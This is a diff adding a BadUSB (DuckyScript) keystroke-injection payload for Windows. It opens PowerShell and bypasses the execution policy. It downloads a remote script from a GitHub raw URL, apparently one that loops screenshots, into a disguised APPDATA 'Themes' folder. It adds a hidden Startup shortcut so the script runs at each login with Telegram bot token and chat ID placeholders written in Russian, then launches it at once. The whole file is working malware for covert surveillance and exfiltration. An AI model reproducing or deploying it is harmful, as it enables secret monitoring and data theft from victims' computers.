@@ -1,0 +1,37 @@
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell
+ENTER
+DELAY 500
+
+STRING Set-ExecutionPolicy Bypass -Scope Process -Force
+ENTER
+
+STRING $hiddenPath = "$env:APPDATA\Microsoft\Windows\Themes"
+ENTER
+STRING if (-not (Test-Path $hiddenPath)) { New-Item -Path $hiddenPath -ItemType Directory -Force | Out-Null }
+ENTER
+STRING $scriptPath = "$hiddenPath\info.ps1"
+ENTER
+
+STRING iwr -UseBasicParsing "https://raw.githubusercontent.com/notepadlinks/loop_screenshots/main/info.ps1" -OutFile $scriptPath
+ENTER
+
+STRING $startupPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\info.ps1.lnk')
+ENTER
+STRING $wsh = New-Object -ComObject WScript.Shell
+ENTER
+STRING $shortcut = $wsh.CreateShortcut($startupPath)
+ENTER
+STRING $shortcut.TargetPath = "powershell.exe"
+ENTER
+STRING $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -botToken `"`"ВАШ ТОКЕН БОТА`"`" -chatId `"`"АЙДИ ВАШЕГО АККА`"`""
+ENTER
+STRING $shortcut.Save()
+ENTER
+
+STRING Start-Sleep -Seconds 2
+ENTER
+STRING $wsh.Run("`"$startupPath`"", 0, $false)
+ENTER
